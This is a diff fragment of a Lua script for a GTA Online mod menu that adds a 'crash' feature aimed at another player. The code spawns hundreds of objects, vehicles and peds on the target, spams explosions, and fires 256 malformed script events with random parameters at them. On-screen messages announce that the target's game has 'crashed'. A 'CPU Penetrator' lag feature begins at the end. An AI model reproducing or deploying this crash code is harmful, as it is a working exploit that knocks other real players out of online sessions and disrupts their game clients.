+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            for i = 1, 1 do  
+                FIRE.ADD_EXPLOSION(pos.x +0, pos.y +65.5, pos.z +10.0, 82, 10, true, false, 1, false)
+                give_object1(pid, 2087304222)
+                give_object1(pid, 1193759130)
+                give_object1(pid, 1964400974)
+                give_object1(pid, -8033527)
+                give_object1(pid, -310622473)
+                give_object1(pid, -500649904)
+                give_object1(pid, -781152544)
+                give_object1(pid, 1536155685)
+                give_object1(pid, -1086368107)
+                give_object1(pid, 430311693)
+                give_object1(pid, 2053587267)
+                give_object1(pid, -1584097999)
+                give_object1(pid, -421266630)
+                give_object1(pid, -652583001)
+                give_object1(pid, 1842258647)
+                give_object1(pid, -1409359059)
+                give_object1(pid, 79058805)
+                give_object1(pid, 1165195353)
+                give_object1(pid, -1133354853)
+                give_object1(pid, -1515174995)
+                give_object1(pid, -1023683840)
+                give_object1(pid, -1742955463)
+                give_object1(pid, 1659646421)
+                give_object1(pid, -1266592510)
+                give_object1(pid, -540782362)
+                give_object1(pid, 635240170)
+                give_object1(pid, -724492621)
+                give_object1(pid, -999719436)
+                give_object1(pid, -2002254222)
+                give_object1(pid, 2139601616)
+                give_object1(pid, 1075432268)
+                give_object1(pid, -498054846)
+                give_object1(pid, -1214293858)
+                give_object1(pid, -1566741232)
+                give_object1(pid, 1938265576)
+                give_object1(pid, 1581459400)
+                give_object1(pid, 1987142870)
+                give_object1(pid, -644915300)
+                give_object1(pid, 333086378)
+                give_object1(pid, -576515524)
+                give_object1(pid, -246597232)
+                give_object1(pid, -1963803813)
+                give_object1(pid, -1283117809)
+                give_object1(pid, -1432298883)
+                give_object1(pid, -1183731840)
+                give_object1(pid, -253978396)
+                give_object1(pid, 993510245)
+                give_object1(pid, -984671127)
+                give_object1(pid, 1356866689)
+                give_object1(pid, 352721947)
+                give_object1(pid, 2085590335)
+                give_object1(pid, 341562675)
+                give_object1(pid, 812397104)
+                give_object1(pid, 590583743)
+                give_object1(pid, -52147427)
+                give_object1(pid, -1312049931)
+                give_object1(pid, -1952814969)
+                give_object1(pid, 2112015640)
+                give_object1(pid, -1486270996)
+                give_object1(pid, 419020243)
+                give_object1(pid, 1319414056)
+                give_object1(pid, 1013548210)
+                give_object1(pid, 1860168086)
+                give_object1(pid, 1181479993)
+                give_object1(pid, 607684038)
+                give_object1(pid, 2051175944)
+                give_object1(pid, 467290531)
+                give_object1(pid, 688475446)
+                give_object1(pid, -172171507)
+                give_object1(pid, 1787587532)
+                give_object1(pid, 1547095841)
+                give_object1(pid, 1174512311)
+                give_object1(pid, 765054337)
+                give_object1(pid, 921231391)
+                give_object1(pid, 1289023059)
+                give_object1(pid, -755359081)
+                give_object1(pid, -1144115258)
+                give_object1(pid, -260968027)
+                give_object1(pid, 2071456372)
+                give_object1(pid, -247908770)
+                give_object1(pid, -1499125472)
+                give_object1(pid, -1766954369)
+                give_object1(pid, -2065152269)
+                give_object1(pid, -1300099069)
+                give_object1(pid, -763801615)
+                give_object1(pid, -1317590321)
+                give_object1(pid, 1437558005)
+                give_object1(pid, -1197050094)
+                give_object1(pid, -1468326899)
+                give_object1(pid, 367798813)
+                give_object1(pid, 674352808)
+                give_object1(pid, -1326130575)
+                give_object1(pid, 1244929250)
+                give_object1(pid, 349605904)
+                give_object1(pid, -1181704684)
+                give_object1(pid, -406357375)
+                give_object1(pid, -1105610407)
+                give_object1(pid, 1761775400)
+                give_object1(pid, 1238061242)
+                give_object1(pid, 1258923146)
+                give_object1(pid, 492521774)
+                give_object1(pid, 797240705)
+                give_object1(pid, 32477783)
+                give_object1(pid, 169396189)
+                give_object1(pid, -1627393663)
+                give_object1(pid, -606981753)
+                give_object1(pid, -1406243308)
+                give_object1(pid, 2141631881)
+                give_object1(pid, -18742627)
+                give_object1(pid, 1533045317)
+                give_object1(pid, 1773562133)
+                give_object1(pid, -699878242)
+                give_object1(pid, -1335342011)
+                give_object1(pid, -1237341649)
+                give_object1(pid, 639966918)
+                give_object1(pid, -8343320)
+                give_object1(pid, 94181889)
+                give_object1(pid, 1293755237)
+                give_object1(pid, -2052658901)
+                give_object1(pid, -157171717)
+                give_object1(pid, -1440635923)
+                give_object1(pid, -1824214632)
+                give_object1(pid, -20901770)
+                give_object1(pid, -1922906158)
+                give_object1(pid, 252606021)
+                give_object1(pid, 1339066922)
+                give_object1(pid, -47892025)
+                give_object1(pid, -1614283661)
+                give_object1(pid, 590062335)
+                give_object1(pid, -1525772156)
+                give_object1(pid, -996007574)
+                give_object1(pid, 261794458)
+                give_object1(pid, -756598242)
+                give_object1(pid, -438534849)
+                give_object1(pid, -1564523101)
+                give_object1(pid, 1496860328)
+                give_object1(pid, 349267712)
+                give_object1(pid, -316967914)
+                give_object1(pid, -1007682309)
+                give_object1(pid, 748055656)
+                give_object1(pid, 1366577387)
+                give_object1(pid, 847347385)
+                give_object1(pid, -2071155078)
+                give_object1(pid, 1269975498)
+                give_object1(pid, -608328040)
+                give_object1(pid, 162624953)
+                give_object1(pid, -1311593370)
+                give_object1(pid, 1487403395)
+                give_object1(pid, 631197463)
+                give_object1(pid, -1459620242)
+                give_object1(pid, 1681817364)
+                give_object1(pid, -945652776)
+                give_object1(pid, -1055097146)
+                give_object1(pid, -1409850900)
+                give_object1(pid, -1773922285)
+                give_object1(pid, -1993723859)
+                give_object1(pid, -1742202260)
+                give_object1(pid, 2068286576)
+                give_object1(pid, 962285623)
+                give_object1(pid, -438279772)
+                give_object1(pid, -419541910)
+                give_object1(pid, 1024779176)
+                give_object1(pid, -1335075707)
+                give_object1(pid, 1639613915)
+                give_object1(pid, -943429800)
+                give_object1(pid, 1646402317)
+                give_object1(pid, 1500357319)
+                give_object1(pid, 355290615)
+                give_object1(pid, 787633963)
+                give_object1(pid, -1300361013)
+                give_object1(pid, -1827077212)
+                give_object1(pid, 1593467078)
+                give_object1(pid, -1050883557)
+                give_object1(pid, -1605085282)
+                give_object1(pid, 90336154)
+                give_object1(pid, 1192565074)
+                give_object1(pid, -429084586)
+                give_object1(pid, -1708398800)
+                give_object1(pid, -2060261324)
+                give_object1(pid, -1903104944)
+                give_object1(pid, -1851357300)
+                give_object1(pid, 252511221)
+                give_object1(pid, 22612995)
+                give_object1(pid, -576619330)
+                give_object1(pid, 915050694)
+                give_object1(pid, -1384362100)
+                give_object1(pid, 1962014499)
+                give_object1(pid, 1255192481)
+                give_object1(pid, -431763373)
+                give_object1(pid, 1406641964)
+                give_object1(pid, 1187892487)
+                give_object1(pid, -1967089259)
+                give_object1(pid, 1924929910)
+                give_object1(pid, -1238481456)
+                give_object1(pid, -672623719)
+                give_object1(pid, 266412233)
+                give_object1(pid, 313871122)
+                give_object1(pid, 1408394397)
+                give_object1(pid, -999474433)
+                give_object1(pid, 340941571)
+                give_object1(pid, -1022725366)
+                give_object1(pid, 676336836)
+                give_object1(pid, 1262821715)
+                give_object1(pid, 1249528776)
+                give_object1(pid, 1040416056)
+                give_object1(pid, 402083591)
+                give_object1(pid, -1225269105)
+                give_object1(pid, 64297753)
+                give_object1(pid, 113556755)
+                give_object1(pid, -1802062442)
+                give_object1(pid, -877285663)
+                give_object1(pid, 1907669430)
+                give_object1(pid, 867476559)
+                give_object1(pid, 1253204874)
+                give_object1(pid, -668962160)
+                give_object1(pid, 1110497611)
+                give_object1(pid, 1100877936)
+                give_object1(pid, -372372024)
+                give_object1(pid, 639239135)
+                give_object1(pid, -1774370481)
+                give_object1(pid, -246692737)
+                give_object1(pid, -1954995488)
+                give_object1(pid, -1191543629)
+                give_object1(pid, 696406833)
+                give_object1(pid, 253006429)
+                give_object1(pid, -444734401)
+                give_object1(pid, -1999143732)
+                give_object1(pid, -1961193897)
+                give_object1(pid, 1898262334)
+                give_object1(pid, 384005660)
+                give_object1(pid, -352333894)
+                give_object1(pid, -1974191568)
+                give_object1(pid, 269485782)
+                give_object1(pid, -1776252406)
+                give_object1(pid, -147858408)
+                give_object1(pid, -626255475)
+                give_object1(pid, 1956579121)
+                give_object1(pid, -1656633628)
+                give_object1(pid, -868581840)
+                give_object1(pid, -145288955)
+                give_object1(pid, 1720153441)
+                give_object1(pid, -1163238668)
+                give_object1(pid, 91827577)
+                give_object1(pid, -193672126)
+                give_object1(pid, -816033362)
+                give_object1(pid, 299521668)
+                give_object1(pid, 128303680)
+                give_object1(pid, 346412082)
+                give_object1(pid, -141160824)
+                give_object1(pid, 791742585)
+                give_object1(pid, 1639439975)
+                give_object1(pid, 2089127153)
+                give_object1(pid, -1970681615)
+                give_object1(pid, 1017495056)
+                give_object1(pid, -693291412)
+                give_object1(pid, 1854176355)
+                give_object1(pid, -143577137)
+                give_object1(pid, 1920539120)
+                give_object1(pid, 2138951683)
+                give_object1(pid, 2926201)
+                give_object1(pid, 588694618)
+                give_object1(pid, 1002527928)
+                give_object1(pid, 657901815)
+                give_object1(pid, -1151335549)
+                give_object1(pid, -535047870)
+                give_object1(pid, -905045155)
+                give_object1(pid, -2016597088)
+                give_object1(pid, 1934369518)
+                give_object1(pid, 798751931)
+                give_object1(pid, 467794033)
+                give_object1(pid, 234501923)
+                give_object1(pid, 1635659404)
+                give_object1(pid, 1884623159)
+                give_object1(pid, -698893408)
+                give_object1(pid, -1175798597)
+                give_object1(pid, -906746081)
+                give_object1(pid, -1294831)
+                give_object1(pid, 2123662446)
+                give_object1(pid, 1592795583)
+                give_object1(pid, -949118781)
+                give_object1(pid, 858281200)
+                give_object1(pid, 462277847)
+                give_object1(pid, 1453112849)
+                give_object1(pid, 767023083)
+                give_object1(pid, 722791674)
+                give_object1(pid, -23412283)
+                give_object1(pid, 1667053900)
+                give_object1(pid, 1845051052)
+                give_object1(pid, -21399333)
+                give_object1(pid, -645785505)
+                give_object1(pid, 1900291931)
+                give_object1(pid, -21856537)
+                give_object1(pid, 1307873876)
+                give_object1(pid, 1647890273)
+                give_object1(pid, -1361987455)
+                give_object1(pid, 579090920)
+                give_object1(pid, 357470310)
+                give_object1(pid, -1668290541)
+                give_object1(pid, -1233252068)
+                give_object1(pid, 1252993669)
+                give_object1(pid, -1166532413)
+                give_object1(pid, 951440198)
+                give_object1(pid, 1019099219)
+                give_object1(pid, -7670236)
+                give_object1(pid, -891962229)
+                give_object1(pid, 1828632807)
+                give_object1(pid, -527731566)
+                give_object1(pid, -101568154)
+                give_object1(pid, 2051732798)
+                give_object1(pid, -1408920051)
+                give_object1(pid, -1374940188)
+                give_object1(pid, -2095073234)
+                give_object1(pid, 781409003)
+                give_object1(pid, 90648387)
+                give_object1(pid, 869134853)
+                give_object1(pid, -2070149054)
+                give_object1(pid, 175871830)
+                give_object1(pid, -1617679134)
+                give_object1(pid, 214479460)
+                give_object1(pid, -1606222828)
+                give_object1(pid, 147259490)
+                give_object1(pid, 644255053)
+                give_object1(pid, -2051274600)
+                give_object1(pid, -892172246)
+                give_object1(pid, -924554442)
+                give_object1(pid, 1954265054)
+                give_object1(pid, -541625023)
+                give_object1(pid, 624253125)
+                give_object1(pid, -1622711733)
+                give_object1(pid, 2055887799)
+                give_object1(pid, -40891276)
+                give_object1(pid, -308199046)
+                give_object1(pid, 368785959)
+                give_object1(pid, -201029917)
+                give_object1(pid, -825823660)
+                give_object1(pid, 713194973)
+                give_object1(pid, 1334368076)
+                give_object1(pid, -1264805106)
+                give_object1(pid, -1619389250)
+                give_object1(pid, -592386971)
+                give_object1(pid, 87915532)
+                give_object1(pid, 420374239)
+                give_object1(pid, -1824681640)
+                give_object1(pid, 43994448)
+                give_object1(pid, -694024018)
+                give_object1(pid, -1483505130)
+                give_object1(pid, -1019540988)
+                give_object1(pid, -2025644504)
+                give_object1(pid, 399125923)
+                give_object1(pid, 732634002)
+                give_object1(pid, 1041449522)
+                give_object1(pid, -1617471970)
+                give_object1(pid, -1963714634)
+                give_object1(pid, 709796306)
+                give_object1(pid, -1754236944)
+                give_object1(pid, -1566617184)
+                give_object1(pid, -872650310)
+                give_object1(pid, -1535902383)
+                give_object1(pid, 2117057129)
+                give_object1(pid, 1342028930)
+                give_object1(pid, 1032385525)
+                give_object1(pid, -473210966)
+                give_object1(pid, -1969460734)
+                give_object1(pid, 935008985)
+                give_object1(pid, -1297807641)
+                give_object1(pid, -2052825844)
+                give_object1(pid, 1005464718)
+                give_object1(pid, 2065026213)
+                give_object1(pid, 377641705)
+                give_object1(pid, 2026094839)
+                give_object1(pid, -924791484)
+                give_object1(pid, -1671333678)
+                give_object1(pid, -1596081609)
+                give_object1(pid, -982242098)
+                give_object1(pid, 2081567852)
+                give_object1(pid, -1615104272)
+                give_object1(pid, -432318791)
+                give_object1(pid, 1912530229)
+                give_object1(pid, -194710140)
+                give_object1(pid, -1546779958)
+                give_object1(pid, 1991134514)
+                give_object1(pid, -1002269212)
+                give_object1(pid, 358694914)
+                give_object1(pid, 1526944277)
+                give_object1(pid, -273037416)
+                give_object1(pid, -778539993)
+                give_object1(pid, -1703283636)
+                give_object1(pid, -960256113)
+                give_object1(pid, -1053717991)
+                give_object1(pid, -1314621230)
+                give_object1(pid, 919114393)
+                give_object1(pid, 438051858)
+                give_object1(pid, -1154165331)
+                give_object1(pid, 1048426695)
+                give_object1(pid, 1002125903)
+                give_object1(pid, 373292107)
+                give_object1(pid, 1154575995)
+                give_object1(pid, 716017543)
+                give_object1(pid, 1179023513)
+                give_object1(pid, -1841267263)
+                give_object1(pid, 2140204525)
+                give_object1(pid, -2020162314)
+                give_object1(pid, 2100850140)
+                give_object1(pid, -1456119620)
+                give_object1(pid, 2065800878)
+                give_object1(pid, 1446131548)
+                give_object1(pid, 1953825788)
+                give_object1(pid, -1476234289)
+                give_object1(pid, -1334262305)
+                give_object1(pid, 1084012181)
+                give_object1(pid, 31833005)
+                give_object1(pid, 1489996351)
+                give_object1(pid, 2053638039)
+                give_object1(pid, 276834062)
+                give_object1(pid, 604103686)
+                give_object1(pid, 956480402)
+                give_object1(pid, 547342811)
+                give_object1(pid, -2112672753)
+                give_object1(pid, 1011350884)
+                give_object1(pid, 1618928353)
+                give_object1(pid, -1353081087)
+                give_object1(pid, -1479664699)
+                give_object1(pid, 1430895338)
+                give_object1(pid, 675274951)
+                give_object1(pid, 213350007)
+                give_object1(pid, 1653623132)
+                give_object1(pid, -269112841)
+                give_object1(pid, -294576776)
+                give_object1(pid, -1798470109)
+                give_object1(pid, -736560690)
+                give_object1(pid, -528401166)
+                give_object1(pid, 622888377)
+                give_object1(pid, -171943901)
+                give_object1(pid, 508864775)
+                give_object1(pid, -271744229)
+                give_object1(pid, -1763055830)
+                give_object1(pid, 838183020)
+                give_object1(pid, 368482553)
+                give_object1(pid, 1802557189)
+                give_object1(pid, 259322409)
+                give_object1(pid, 1889796391)
+                give_object1(pid, 483613343)
+                give_object1(pid, -1814837934)
+                give_object1(pid, 232962702)
+                give_object1(pid, 1206778303)
+                give_object1(pid, 2067417152)
+                give_object1(pid, -1210399798)
+                give_object1(pid, -590146742)
+                give_object1(pid, 1359592635)
+                give_object1(pid, 492575597)
+                give_object1(pid, -387521298)
+                give_object1(pid, -721895765)
+                give_object1(pid, -132789682)
+                give_object1(pid, -177480482)
+                give_object1(pid, -455361602)
+                give_object1(pid, -790849738)
+                give_object1(pid, -1731941480)
+                give_object1(pid, 2018317371)
+                give_object1(pid, 1561943508)
+                give_object1(pid, -332131798)
+                give_object1(pid, -601985968)
+                give_object1(pid, 285787722)
+                give_object1(pid, 2069444788)
+                give_object1(pid, -448693971)
+                give_object1(pid, 275794448)
+                give_object1(pid, 581889677)
+                give_object1(pid, -106487292)
+                give_object1(pid, -807594098)
+                give_object1(pid, -535349246)
+                give_object1(pid, 417944961)
+                give_object1(pid, -871236969)
+                give_object1(pid, -867376114)
+                give_object1(pid, 2120265392)
+                give_object1(pid, 440714328)
+                give_object1(pid, -942910394)
+                give_object1(pid, 1368830751)
+                give_object1(pid, -1551758414)
+                give_object1(pid, -1556823922)
+                give_object1(pid, 1745383396)
+                give_object1(pid, 797015791)
+                give_object1(pid, 1131390643)
+                give_object1(pid, 682422711)
+                give_object1(pid, 1945191539)
+                give_object1(pid, 495380854)
+                give_object1(pid, -2139330164)
+                give_object1(pid, 1385526236)
+                give_object1(pid, -2009950230)
+                give_object1(pid, -10278922)
+                give_object1(pid, -1530258765)
+                give_object1(pid, -79978204)
+                give_object1(pid, -937756226)
+                give_object1(pid, -765880741)
+                give_object1(pid, -589046858)
+                give_object1(pid, -600415835)
+                give_object1(pid, -1293487551)
+                give_object1(pid, -1173362295)
+                give_object1(pid, 741933698)
+                give_object1(pid, -1188733122)
+                give_object1(pid, -688012791)
+                give_object1(pid, -920585494)
+                give_object1(pid, 2005313754)
+                give_object1(pid, -372354415)
+                give_object1(pid, 286298615)
+                give_object1(pid, 12751331)
+                give_object1(pid, 202070568)
+                give_object1(pid, 1507202536)
+                give_object1(pid, -1656576146)
+                give_object1(pid, 1900909486)
+                give_object1(pid, 1720432065)
+                give_object1(pid, 795984016)
+                give_object1(pid, 1994282598)
+                give_object1(pid, 1543408104)
+                give_object1(pid, -465246693)
+                give_object1(pid, -177141645)
+                give_object1(pid, 434950506)
+                give_object1(pid, -124033353)
+                give_object1(pid, 103179737)
+                give_object1(pid, 925058130)
+                give_object1(pid, 2140733815)
+                give_object1(pid, -1498244144)
+                give_object1(pid, 1476149726)
+                give_object1(pid, 2088303372)
+                give_object1(pid, 785676028)
+                give_object1(pid, 616522692)
+                give_object1(pid, -1719442365)
+                give_object1(pid, -1741901560)
+                give_object1(pid, -2068583636)
+                give_object1(pid, 231325255)
+                give_object1(pid, 643649573)
+                give_object1(pid, 500687632)
+                give_object1(pid, -1580866404)
+                give_object1(pid, 928394347)
+                give_object1(pid, 1446045988)
+                give_object1(pid, 1609878359)
+                give_object1(pid, 944662010)
+                util.yield(10)
+            end
+            for i = 1, 50 do  
+                FIRE.ADD_EXPLOSION(pos.x +0, pos.y +65.5, pos.z +10.0, 82, 10, true, false, 1, false)
+                give_vehicle1(pid, util.joaat("alkonost"))
+                give_vehicle1(pid, util.joaat("alkonost"))
+                give_vehicle1(pid, util.joaat("alkonost"))
+                give_vehicle1(pid, util.joaat("alkonost"))
+                give_ped1(pid, 1057201338)
+                give_ped1(pid, 1057201338)
+                give_ped1(pid, 1057201338)
+                give_ped1(pid, -2056455422)
+                give_ped1(pid, -1323586730)
+                give_ped1(pid, -1323586730)
+                util.yield(10)
+            end
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            util.yield(333)
+            CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
+            break
+        end
+        GRAPHICS.SET_SCRIPT_GFX_DRAW_ORDER(0)
+        GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
+        GRAPHICS.RESET_SCRIPT_GFX_ALIGN()
+    end
+    CAM.DO_SCREEN_FADE_OUT(500)
+    util.yield(600)
+    GRAPHICS.ANIMPOSTFX_STOP('MP_OrbitalCannon')
+    CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
+    CAM.SET_CAM_ACTIVE(cam, false)
+    CAM.DESTROY_CAM(cam, false)
+    HUD.DISPLAY_RADAR(true)
+    STREAMING.CLEAR_FOCUS()
+    GRAPHICS.CLEAR_DRAW_ORIGIN()
+    util.yield(1300)
+    CAM.DO_SCREEN_FADE_IN(0)
+    menu.trigger_commands('becomeorbitalcannon off')
+    menu.trigger_commands("anticrashcamera")
+    util.toast("Its possible his game CrAShEd, 50/50, the russian roulette !")
+    if not crash_in_progress0 then   
+        crash_in_progress0 = true    
+        script = {}
+        function script.trigger_script_event(first_arg, receiver, args)
+            table.insert(args, 1, first_arg)
+            util.trigger_script_event(1 << receiver, args)
+        end
+        for i = 1, 256 do
+            local parameters = {pid, -1774405356, math.random(0, 4), math.random(0, 1)}
+            for i = 5, 13 do
+                parameters[i] = math.random(-2147483647, 2147483647)
+            end
+            parameters[10] = pid
+            script.trigger_script_event(677240627, pid, parameters)
+        end
+        util.yield(500)
+        crash_in_progress0 = false
+    end
+    if crash_in_progress0 then
+        util.toast("Chill dude, you have another crash in progress", red2)
+    end
+    util.yield(13300)
+    local ct = 0
+    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
+        entities.delete_by_handle(ent)
+        ct = ct + 1
+    end
+    for k,ent in pairs(entities.get_all_peds_as_handles()) do
+        if not is_ped_player(ent) then
+            entities.delete_by_handle(ent)
+        end
+        ct = ct + 1
+    end
+    for k,ent in pairs(entities.get_all_objects_as_handles()) do
+        entities.delete_by_handle(ent)
+        ct = ct + 1
+    end
+    util.toast("Super cleanse is complete! " .. ct .. " entities removed.")
+    util.yield(5000)
+    menu.trigger_commands("tpmazehelipad")
+    util.yield(2000)
+    if not players.exists(pid) then
+        util.toast("Player CrAsH !!!")
+        util.stop_thread()
+    end	
+    local ct = 0
+    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
+        entities.delete_by_handle(ent)
+        ct = ct + 1
+    end
+    for k,ent in pairs(entities.get_all_peds_as_handles()) do
+        if not is_ped_player(ent) then
+            entities.delete_by_handle(ent)
+        end
+        ct = ct + 1
+    end
+    for k,ent in pairs(entities.get_all_objects_as_handles()) do
+        entities.delete_by_handle(ent)
+        ct = ct + 1
+    end
+    util.toast("Super cleanse is complete! " .. ct .. " entities removed.")
+    util.yield(5000)
+    if not players.exists(pid) then
+        util.toast("Player CrAsH !!!")
+        util.stop_thread()
+    end	
+--v3.new(0.0, 300.0, 40.0)
+
+--local tar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+end)    
 
     menu.toggle_loop(lagwiths,"CPU Penetrator", {"cpulag"}, "Lag them do do do it.", function()
         while not STREAMING.HAS_MODEL_LOADED(447548909) do
